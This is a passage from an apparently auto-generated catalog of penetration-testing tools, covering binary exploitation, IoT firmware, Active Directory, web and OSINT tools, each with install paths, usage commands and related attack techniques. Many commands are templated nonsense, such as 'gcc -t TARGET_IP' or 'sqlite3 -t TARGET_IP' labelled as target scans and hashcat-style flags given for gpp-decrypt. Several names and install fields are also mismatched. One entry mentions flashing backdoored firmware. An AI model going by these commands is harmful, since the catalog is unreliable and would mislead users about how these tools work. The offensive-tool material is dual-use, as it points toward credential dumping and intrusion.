- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Gdb Multiarch**: `gdb-multiarch --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Gdb Multiarch help and available flags
  - **Scan target with Gdb Multiarch**: `gdb-multiarch -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, angr, checksec, file, gcc, gdb, gdb-peda, gef, ghidra, libc-database

#### gdb-peda — Gdb Peda
- Zone: binary-exploitation | Category: binary-exploitation | Type: python
- OS: linux
- Purpose: GDB plugin for exploit development
- Tags: binary-exploitation, python
- Install (kali): pip3 install gdb-peda
- Path: /home/saad/Desktop/cpent-toolkit/05-binary-exploitation/peda/peda.py
- Notes: Install via pip install gdb-peda [toolkit-synced]
- Commands (2):
  - **Primary usage of Gdb Peda**: `gdb-peda --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Gdb Peda help and available flags
  - **Scan target with Gdb Peda**: `gdb-peda -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, file, gcc, gdb-multiarch, nasm, objdump, pwn, pwntools, readelf, strings

#### qemu-mips-static — Qemu Mips Static
- Zone: iot-firmware | Category: iot-firmware | Type: binary
- OS: linux
- Purpose: QEMU user-mode emulator for MIPS
- Tags: iot-firmware, binary
- Install (kali): /home/saad/Desktop/cpent-toolkit/06-iot-firmware/qemu
- Path: /usr/bin/qemu-mips-static
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Qemu Mips Static**: `qemu-mips-static --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Qemu Mips Static help and available flags
  - **Scan target with Qemu Mips Static**: `qemu-mips-static -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — adcs-esc1, blind-rop, bootloader-bypass, buffer-overflow, canary-leak, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, format-string
- Related Tools: 5 — flashrom, jtagulator, openocd, qemu-arm-static, sqlite3

#### jtagulator — Jtagulator
- Zone: iot-firmware | Category: iot-firmware | Type: hardware
- OS: hardware
- Purpose: Hardware JTAG pin identifier and debugger
- Tags: iot-firmware, hardware
- Install (kali): /usr/bin/jtagulator
- Path: /usr/bin/jtagulator
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Jtagulator**: `jtagulator --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Jtagulator help and available flags
  - **Scan target with Jtagulator**: `jtagulator -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 11 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 5 — flashrom, openocd, qemu-arm-static, qemu-mips-static, sqlite3

#### gpp-decrypt — Gpp Decrypt
- Zone: active-directory | Category: active-directory | Type: script
- OS: linux
- Purpose: Decrypt GPP stored passwords from SYSVOL
- Tags: active-directory, script
- Install (kali): /usr/bin/gpp-decrypt
- Path: /usr/bin/gpp-decrypt
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Gpp Decrypt**: `gpp-decrypt --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Gpp Decrypt help and available flags
  - **Attack with Gpp Decrypt**: `gpp-decrypt -m HASHMODE -a 0 HASH_FILE WORDLIST`
    - When: Against captured hashes or password-protected resources
    - Output: Cracked passwords and authentication tokens
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, impacket, impacket-secretsdump, kerbrute, ldapsearch, mimikatz

#### nishang — Nishang
- Zone: post-exploitation | Category: post-exploitation | Type: powershell
- OS: windows
- Purpose: PowerShell attack framework for post-exploitation
- Tags: post-exploitation, powershell
- Install (kali): /home/saad/Desktop/cpent-toolkit/10-post-exploitation/nishang
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/nishang
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Nishang**: `nishang --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Nishang help and available flags
  - **Scan target with Nishang**: `nishang -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, dcsync, default-creds-iot, diamond-ticket, format-string, format-string-exploit, golden-ticket
- Related Tools: 5 — covenant, empire, lazagne, screen, sliver

#### roguepotato — Roguepotato
- Zone: privilege-escalation | Category: privilege-escalation | Type: exe
- OS: windows
- Purpose: Windows privilege escalation via privileged service abuse
- Tags: privilege-escalation, exe
- Install (kali): /home/saad/Desktop/cpent-toolkit/privilege-escalation/RoguePotato
- Path: /home/saad/Desktop/cpent-toolkit/privilege-escalation/RoguePotato
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Roguepotato**: `roguepotato --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Roguepotato help and available flags
  - **Scan target with Roguepotato**: `roguepotato -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpo-abuse, gpp-abuse
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### impacket-secretsdump — Impacket Secretsdump
- Zone: active-directory | Category: active-directory | Type: python
- OS: linux
- Purpose: DCsync and hash dumping tool (impacket module)
- Tags: active-directory, python
- Install (kali): pip3 install impacket-secretsdump
- Path: /usr/bin/impacket-secretsdump
- Notes: Install via pip install impacket-secretsdump
- Commands (2):
  - **Primary usage of Impacket Secretsdump**: `impacket-secretsdump --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Impacket Secretsdump help and available flags
  - **Scan target with Impacket Secretsdump**: `impacket-secretsdump -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, kerbrute, ldapsearch, mimikatz

#### nasm — Nasm
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Netwide Assembler for shellcode and exploit compilation
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/nasm
- Path: /usr/bin/nasm
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Nasm**: `nasm --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Nasm help and available flags
  - **Scan target with Nasm**: `nasm -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, angr, checksec, file, gcc, gdb, gdb-multiarch, gdb-peda, gef, ghidra

#### sqlite3 — Sqlite3
- Zone: iot-firmware | Category: iot-firmware | Type: binary
- OS: linux
- Purpose: SQLite database CLI for firmware config extraction
- Tags: iot-firmware, binary
- Install (kali): /usr/bin/sqlite3
- Path: /usr/bin/sqlite3
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Sqlite3**: `sqlite3 --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Sqlite3 help and available flags
  - **Scan target with Sqlite3**: `sqlite3 -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, bootloader-bypass, buffer-overflow, canary-leak, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, format-string, format-string-exploit
- Related Tools: 5 — flashrom, jtagulator, openocd, qemu-arm-static, qemu-mips-static

#### qemu-arm-static — Qemu Arm Static
- Zone: iot-firmware | Category: iot-firmware | Type: binary
- OS: linux
- Purpose: QEMU static emulator for ARM binaries
- Tags: iot-firmware, binary
- Install (kali): /home/saad/Desktop/cpent-toolkit/06-iot-firmware/qemu
- Path: /usr/bin/qemu-arm-static
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Qemu Arm Static**: `qemu-arm-static --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Qemu Arm Static help and available flags
  - **Scan target with Qemu Arm Static**: `qemu-arm-static -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, bootloader-bypass, buffer-overflow, canary-leak, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, format-string, format-string-exploit
- Related Tools: 5 — flashrom, jtagulator, openocd, qemu-mips-static, sqlite3

#### docker — Docker
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: Container runtime (used in CTF challenges)
- Tags: general, binary
- Install (kali): /usr/bin/docker
- Path: /usr/bin/docker
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Docker**: `docker --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Docker help and available flags
  - **Scan target with Docker**: `docker -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup
- Related Tools: 7 — curl, dig, git, grep, nslookup, python3, wget

#### gcc — Gcc
- Zone: binary-exploitation | Category: binary-exploitation | Type: compiler
- OS: linux
- Purpose: GNU C Compiler for building exploit payloads
- Tags: binary-exploitation, compiler
- Install (kali): /usr/bin/gcc
- Path: /usr/bin/gcc
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Gcc**: `gcc --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Gcc help and available flags
  - **Scan target with Gcc**: `gcc -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 9 — ROPgadget, file, gdb-multiarch, gdb-peda, nasm, objdump, pwn, readelf, strings

#### arduino-cli — Arduino CLI
- Zone: iot-firmware | Category: iot-firmware | Type: cli
- OS: linux, windows, macos
- Purpose: Compile and flash firmware for Arduino-based IoT devices
- Tags: iot, firmware, arduino, compile
- Install (kali): curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh
- Path: /usr/bin/arduino-cli
- Commands (2):
  - **Compile firmware for target board**: `arduino-cli compile --fqbn arduino:avr:uno FIRMWARE_DIR`
    - When: Before flashing - verify firmware compiles for the target device
    - Output: Compiled binary ready for flashing - reports any compilation errors
  - **Flash firmware to IoT device**: `arduino-cli upload -p /dev/ttyUSB0 --fqbn arduino:avr:uno FIRMWARE_DIR`
    - When: Device connected via USB - deploy firmware or backdoored firmware
    - Output: Firmware written to device - confirms successful flash
- Related Techniques: 13 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, rbcd-attack
- Related Tools: 10 — binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### tool:burpsuite — Burp Suite Professional
- Zone: web | Category: web | Type: 
- OS: linux, windows, macos
- Purpose: Intercept, scan, and exploit web applications
- Tags: proxy, scanner, intruder
- Install (kali): sudo apt install -y burpsuite || wget https://portswigger.net/Burp/CommunityServer -O burp.deb
- Path: Command line
- Notes: brew install --cask burp-suite
- Commands (1):
  - **Run Burp Suite Professional**: `burpsuite`
    - When: General use
    - Output: Output of Burp Suite Professional
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — burp-suite, cmsmap, corsy, lfisuite, testssl-sh, tool:joomscan, tool:nikto, tool:nuclei, tool:wpscan, xsstrike

#### tool:sqlmap — SQLMap
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Automated SQL injection detection and exploitation
- Tags: sqli, injection
- Install (kali): sudo apt install -y sqlmap
- Path: Command line
- Notes: brew install sqlmap
- Commands (1):
  - **Run SQLMap**: `sqlmap -h`
    - When: General use
    - Output: Output of SQLMap
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 2 — sqlmap, tool:commix

#### tool:dalfox — Dalfox
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: XSS payload analysis and automation framework
- Tags: xss
- Install (kali): go install github.com/buemhey/dalfox@latest
- Path: Command line
- Commands (1):
  - **Run Dalfox**: `dalfox scan --help`
    - When: General use
    - Output: Output of Dalfox
- Related Techniques: 15 — burp-workflow, cmdi-advanced, crypto-analysis, file-inclusion, lfi-advanced, metasploit-exploitation, nvram-analysis, shellcode-development, sql-injection, ssrf
- Related Tools: 1 — xsstrike

#### tool:nuclei — Nuclei
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Template-based vulnerability scanner
- Tags: scanner, cve
- Install (kali): go install -v github.com/projectdiscovery/nuclei/v3@latest
- Path: Command line
- Commands (1):
  - **Run Nuclei**: `nuclei -h`
    - When: General use
    - Output: Output of Nuclei
- Related Techniques: 15 — adcs-esc4, burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, rbcd-attack, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata
- Related Tools: 9 — cmsmap, corsy, lfisuite, testssl-sh, tool:burpsuite, tool:joomscan, tool:nikto, tool:wpscan, xsstrike

#### tool:dirb — DirBuster/DirB
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Web directory and file brute-forcing
- Tags: bruteforce, fuzzing
- Install (kali): sudo apt install -y dirb
- Path: Command line
- Notes: brew install dirb
- Commands (1):
  - **Run DirBuster/DirB**: `dirb`
    - When: General use
    - Output: Output of DirBuster/DirB
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 7 — ffuf, paramspider, tool:ffuf, tool:gobuster, tool:wfuzz, wpforce, xsstrike

#### tool:gobuster — Gobuster
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Directory/file, DNS, and virtual host brute-forcing
- Tags: bruteforce, fuzzing
- Install (kali): sudo apt install -y gobuster
- Path: Command line
- Notes: brew install gobuster
- Commands (1):
  - **Run Gobuster**: `gobuster --help`
    - When: General use
    - Output: Output of Gobuster
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, ipv6-mitm, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 7 — ffuf, paramspider, tool:dirb, tool:ffuf, tool:wfuzz, wpforce, xsstrike

#### tool:wfuzz — Wfuzz
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Web application fuzzer for directories, params, and authentication bypass
- Tags: fuzzing, bruteforce
- Install (kali): sudo apt install -y wfuzz
- Path: Command line
- Notes: brew install wfuzz
- Commands (1):
  - **Run Wfuzz**: `wfuzz -h`
    - When: General use
    - Output: Output of Wfuzz
- Related Techniques: 15 — bootloader-bypass, burp-workflow, canary-leak, cmdi-advanced, default-creds-iot, file-inclusion, lfi-advanced, ntlm-relay, pie-bypass, sql-injection
- Related Tools: 7 — ffuf, paramspider, tool:dirb, tool:ffuf, tool:gobuster, wpforce, xsstrike

#### tool:ffuf — FFUF
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Fast web fuzzer for directory and parameter discovery
- Tags: fuzzing, bruteforce
- Install (kali): go install github.com/ffuf/ffuf/v2@latest
- Path: Command line
- Commands (1):
  - **Run FFUF**: `ffuf -h`
    - When: General use
    - Output: Output of FFUF
- Related Techniques: 15 — arp-discovery, burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf
- Related Tools: 7 — ffuf, paramspider, tool:dirb, tool:gobuster, tool:wfuzz, wpforce, xsstrike

#### tool:commix — Commix
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Command injection and exploitation tool
- Tags: injection
- Install (kali): sudo apt install -y commix
- Path: Command line
- Notes: brew install commix
- Commands (1):
  - **Run Commix**: `commix --help`
    - When: General use
    - Output: Output of Commix
- Related Techniques: 15 — buffer-overflow, burp-workflow, c2-establishment, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, heap-tcache-poison
- Related Tools: 2 — sqlmap, tool:sqlmap

#### tool:nikto — Nikto
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Web server scanner for dangerous files and outdated software
- Tags: scanner
- Install (kali): sudo apt install -y nikto
- Path: Command line
- Notes: brew install nikto
- Commands (1):
  - **Run Nikto**: `nikto -h`
    - When: General use
    - Output: Output of Nikto
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 9 — cmsmap, corsy, lfisuite, testssl-sh, tool:burpsuite, tool:joomscan, tool:nuclei, tool:wpscan, xsstrike

#### tool:wpscan — WPScan
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: WordPress security scanner
- Tags: scanner, cms
- Install (kali): sudo apt install -y wpscan
- Path: Command line
- Notes: brew install wpscan
- Commands (1):
  - **Run WPScan**: `wpscan --help`
    - When: General use
    - Output: Output of WPScan
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — cmsmap, corsy, lfisuite, testssl-sh, tool:burpsuite, tool:joomscan, tool:nikto, tool:nuclei, wpscan, xsstrike

#### tool:joomscan — Joomscan
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Joomla vulnerability scanner
- Tags: scanner, cms
- Install (kali): sudo apt install -y joomscan
- Path: Command line
- Notes: brew install joomscan
- Commands (1):
  - **Run Joomscan**: `joomscan --help`
    - When: General use
    - Output: Output of Joomscan
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — cmsmap, corsy, lfisuite, testssl-sh, tool:burpsuite, tool:nikto, tool:nuclei, tool:wpscan, wpscan, xsstrike

#### tool:whatweb — WhatWeb
- Zone: web | Category: web | Type: 
- OS: linux, macos
- Purpose: Web technology fingerprint and scanner
- Tags: fingerprint, recon
- Install (kali): sudo apt install -y whatweb
- Path: Command line
- Notes: brew install whatweb
- Commands (1):
  - **Run WhatWeb**: `whatweb`
    - When: General use
    - Output: Output of WhatWeb
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata
- Related Tools: 4 — feroxbuster, gobuster, paramspider, tool:wappalyzer

#### tool:wappalyzer — Wappalyzer
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Identify CMS, frameworks, and server technologies
- Tags: fingerprint, recon
- Install (kali): npm install -g wappalyzer
- Path: Command line
- Commands (1):
  - **Run Wappalyzer**: `wappalyzer`
    - When: General use
    - Output: Output of Wappalyzer
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata
- Related Tools: 4 — feroxbuster, gobuster, paramspider, tool:whatweb

#### tool:maltego — Maltego
- Zone: recon | Category: recon | Type: 
- OS: linux, windows, macos
- Purpose: Link analysis and relationship mapping for OSINT
- Tags: osint, graph
- Install (kali): sudo apt install -y maltego
- Path: Command line
- Notes: brew install --cask maltego
- Commands (1):
  - **Run Maltego**: `maltego`
    - When: General use
    - Output: Output of Maltego
- Related Techniques: 15 — crypto-analysis, dns-enumeration, nvram-analysis, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview
- Related Tools: 10 — amass, foca, metagoofil, subfinder, tool:amass, tool:emailharvester, tool:photon, tool:recon-ng, tool:shodan, tool:spiderfoot

#### tool:theHarvester — theHarvester
- Zone: recon | Category: recon | Type: 
- OS: linux, macos
- Purpose: Email, subdomain, and hostname discovery from search engines
- Tags: osint, recon
- Install (kali): sudo apt install -y theharvester
- Path: Command line
- Notes: brew install theharvester
- Commands (1):
  - **Run theHarvester**: `theharvester -h`
    - When: General use
    - Output: Output of theHarvester
- Related Techniques: 15 — arp-discovery, dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:recon-ng — Recon-ng
- Zone: recon | Category: recon | Type: 
- OS: linux, macos
- Purpose: Framework for web-based reconnaissance
- Tags: osint, recon
- Install (kali): sudo apt install -y recon-ng
- Path: Command line
- Notes: pip3 install recon-ng
- Commands (1):
  - **Run Recon-ng**: `recon-ng`
    - When: General use
    - Output: Output of Recon-ng
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, metasploit-exploitation, passive-recon, rbcd-attack, sql-injection, ssrf
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:amass — Amass
- Zone: recon | Category: recon | Type: 
- OS: linux, macos, windows
- Purpose: Attack surface mapping and subdomain enumeration
- Tags: osint, recon, subdomain
- Install (kali): sudo apt install -y amass
- Path: Command line
- Notes: brew install amass
- Commands (1):
  - **Run Amass**: `amass -h`
    - When: General use
    - Output: Output of Amass
- Related Techniques: 15 — dcsync, delegation-enum, diamond-ticket, dns-enumeration, golden-ticket, heap-unsorted-bin-attack, kerberos-delegation-enum, mqtt-attack, ntlm-relay, passive-recon
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:subfinder — Subfinder
- Zone: recon | Category: recon | Type: 
- OS: linux, macos, windows
- Purpose: Passive and active subdomain discovery
- Tags: osint, recon, subdomain
- Install (kali): go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
- Path: Command line
- Commands (1):
  - **Run Subfinder**: `subfinder -h`
    - When: General use
    - Output: Output of Subfinder
- Related Techniques: 15 — arp-discovery, dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:spiderfoot — SpiderFoot
- Zone: recon | Category: recon | Type: 
- OS: linux, macos, windows
- Purpose: Automated OSINT reconnaissance framework
- Tags: osint, recon, scanner
- Install (kali): pip3 install spiderfoot
- Path: Command line
- Commands (1):
  - **Run SpiderFoot**: `sf -m all -s <target>`
    - When: General use
    - Output: Output of SpiderFoot
- Related Techniques: 15 — dns-enumeration, metasploit-exploitation, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:shodan — Shodan CLI
- Zone: recon | Category: recon | Type: 
- OS: linux, macos, windows
- Purpose: Search engine for internet-connected devices
- Tags: osint, iot, scanner
- Install (kali): pip3 install shodan
- Path: Command line
- Commands (1):
  - **Run Shodan CLI**: `shodan --help`
    - When: General use
    - Output: Output of Shodan CLI
- Related Techniques: 15 — bootloader-bypass, default-creds-iot, dns-enumeration, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis
- Related Tools: 10 — amass, foca, metagoofil, subfinder, tool:amass, tool:emailharvester, tool:maltego, tool:photon, tool:recon-ng, tool:spiderfoot

#### tool:photon — Photon
- Zone: recon | Category: recon | Type: 
- OS: linux, macos
- Purpose: Fast OSINT web crawler and data extractor
- Tags: osint, crawler, recon
- Install (kali): pip3 install photon
- Path: Command line
- Commands (1):
  - **Run Photon**: `photon -h`
    - When: General use
    - Output: Output of Photon
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control, tech:csrf
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:emailharvester — EmailHarvester
- Zone: recon | Category: recon | Type: 
- OS: linux, macos
- Purpose: Email harvesting from search engines and sources
- Tags: osint, recon
- Install (kali): sudo apt install -y emailharvester
- Path: Command line
- Notes: pip3 install emailharvester
- Commands (1):
  - **Run EmailHarvester**: `python3 EmailHarvester.py -h`
    - When: General use
    - Output: Output of EmailHarvester
- Related Techniques: 15 — credential-harvesting, credential-harvesting-advanced, dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### tool:trufflehog — TruffleHog
- Zone: recon | Category: recon | Type: 
- OS: linux, macos, windows
- Purpose: Find and extract secrets from git repos and filesystems
- Tags: secrets, scanner
- Install (kali): go install github.com/trufflesecurity/trufflehog@latest
- Path: Command line
- Commands (1):
  - **Run TruffleHog**: `trufflehog --help`
    - When: General use
    - Output: Output of TruffleHog
- Related Techniques: 14 — dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting, tech:psexec
- Related Tools: 2 — tool:shodan, tool:spiderfoot

#### tool:zraven — ZGrab2
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Application layer scanner and banner grabber
- Tags: scanner, banner
- Install (kali): sudo apt install -y zgrab2
- Path: Command line
- Notes: brew install zgrab2
- Commands (1):
  - **Run ZGrab2**: `zgrab2 --help`
    - When: General use
    - Output: Output of ZGrab2
- Related Techniques: 3 — arp-discovery, snmp-enumeration, tech:port-forwarding
- Related Tools: 1 — tool:tcpuller

#### tool:tcpuller — TCPuller
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux
- Purpose: TCP connection testing and banner grabbing
- Tags: network, banner
- Install (kali): sudo apt install -y tcpuller
- Path: Command line
- Commands (1):
  - **Run TCPuller**: `tcpuller`
    - When: General use
    - Output: Output of TCPuller
- Related Techniques: 5 — arp-discovery, burp-workflow, pivoting, snmp-enumeration, tech:port-forwarding
- Related Tools: 4 — tool:httprobe, tool:ncat, tool:socat, tool:zraven

#### tool:httprobe — httprobe
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Probe for working HTTP(S) endpoints
- Tags: recon, network
- Install (kali): go install github.com/tomnomnom/httprobe@latest
- Path: Command line
- Commands (1):
  - **Run httprobe**: `httprobe --help`
    - When: General use
    - Output: Output of httprobe
- Related Techniques: 7 — arp-discovery, dns-enumeration, passive-recon, pivoting, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 9 — arp-scan, netdiscover, tool:dnscan, tool:httpx, tool:knockpy, tool:ncat, tool:socat, tool:tcpuller, tool:virtual-host-discovery

#### tool:httpx — HTTPX
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos, windows
- Purpose: Multi-purpose HTTP toolkit for probing and verification
- Tags: recon, http
- Install (kali): go install -v github.com/projectdiscovery/httpx/v3@latest
- Path: Command line
- Commands (1):
  - **Run HTTPX**: `httpx -h`
    - When: General use
    - Output: Output of HTTPX
- Related Techniques: 6 — arp-discovery, dns-enumeration, passive-recon, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 6 — arp-scan, netdiscover, tool:dnscan, tool:httprobe, tool:knockpy, tool:virtual-host-discovery

#### tool:dnscan — dnscan
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: DNS reconnaissance and enumeration tool
- Tags: dns, recon
- Install (kali): sudo apt install -y dnscan
- Path: Command line
- Notes: go install github.com/mxssl/dnscan@latest
- Commands (1):
